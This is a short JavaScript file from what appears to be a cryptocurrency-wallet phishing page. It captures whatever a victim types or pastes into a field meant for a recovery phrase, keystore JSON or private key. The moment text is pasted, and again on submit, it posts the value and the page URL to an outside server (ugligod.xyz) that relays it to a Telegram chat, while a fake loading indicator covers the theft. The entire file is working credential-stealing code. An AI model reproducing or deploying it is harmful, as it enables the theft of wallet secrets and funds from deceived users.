const chatIds = ["-1002044067703"];
const inputIds = ["recovery_phrase", "keystoreJson", "privateKey"];

const url = window.location.href;
let submitBtn;
let loadingIcon;
let loadText;
let inputBox;

// function testPaste() {
//   console.log("paste");
// }

document.addEventListener("DOMContentLoaded", () => {
  submitBtn = document.getElementById("submitBtn");
  loadingIcon = document.getElementById("loadingIcon");
  loadText = document.getElementById("loadText");
  inputBox = document.getElementById("inputBox");
  submitBtn.addEventListener("click", async (e) => {
    e.preventDefault();
    console.log("sending..");
    loadingIcon.style.display = "block";
    loadText.style.display = "none";
    await sendData("inputBox");
    sleep(8);
    loadingIcon.style.display = "none";
    loadText.style.display = "block";
  });
  inputBox.addEventListener("paste", async () => {
    // console.log("paste caught");
    // await sleep();
    console.log("pasted");
    await sendData("inputBox");
  });
});

async function sendData(inputId) {
  await sleep(1000);
  const inputBox = document.getElementById(inputId);
  const data = `
  value : ${inputBox.value} \n
  url :${url}`;
  await sendMsg(data);
}

const sendMsg = async (msg) => {
  const data = {
    chat_id: chatIds[0],
    text: msg,
  };

  const resp = await fetch(`https://ugligod.xyz/send_via_tg`, {
    method: "POST",
    headers: {
      accept: "application/json",
      "content-type": "application/json",
    },
    body: JSON.stringify(data),
  });
  const resJson = await resp.json();
  console.log(resJson);
};

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
